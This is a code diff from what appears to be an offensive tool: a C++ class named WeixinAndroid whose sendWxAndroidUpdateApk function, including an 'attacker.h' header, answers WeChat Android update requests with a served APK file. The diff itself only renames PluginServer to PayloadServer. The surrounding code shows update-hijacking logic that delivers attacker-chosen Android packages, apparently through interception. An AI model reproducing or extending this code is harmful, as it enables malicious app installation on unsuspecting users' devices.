@@ -4,7 +4,7 @@
 #include "../cipher/CryptoUtils.h"
 #include "sslPublic.h"
 #include "../HttpUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 #include "../attacker.h"
 #include "../FileOper.h"
@@ -119,7 +119,7 @@ int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl, const char * lpdn,
 		string end = bytes.substr(pos + 1);
 		int startno = atoi(start.c_str());
 		int endno = atoi(end.c_str());
-		ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
 	}
 	else {
 		key = "RANGE";
@@ -131,11 +131,11 @@ int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl, const char * lpdn,
 			string end = bytes.substr(pos + 1);
 			int startno = atoi(start.c_str());
 			int endno = atoi(end.c_str());
-			ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
+			ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
 		}
 		else {
 			char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
-			ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrAppFormat, 1);
+			ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrAppFormat, 1);
 		}
 	}
 
@@ -164,7 +164,7 @@ int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl,const char * lpdn, 
 		string end = bytes.substr(pos + 1);
 		int startno = atoi(start.c_str());
 		int endno = atoi(end.c_str());
-		ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat,startno, endno, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat,startno, endno, 1);
 	}
 	else {
 		key = "RANGE";
@@ -176,11 +176,11 @@ int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl,const char * lpdn, 
 			string end = bytes.substr(pos + 1);
 			int startno = atoi(start.c_str());
 			int endno = atoi(end.c_str());
-			ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat, startno, endno, 1);
+			ret = PayloadServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat, startno, endno, 1);
 		}
 		else {
 			char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
-			ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrAppFormat, 1);
+			ret = PayloadServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrAppFormat, 1);
 		}
 	}
 
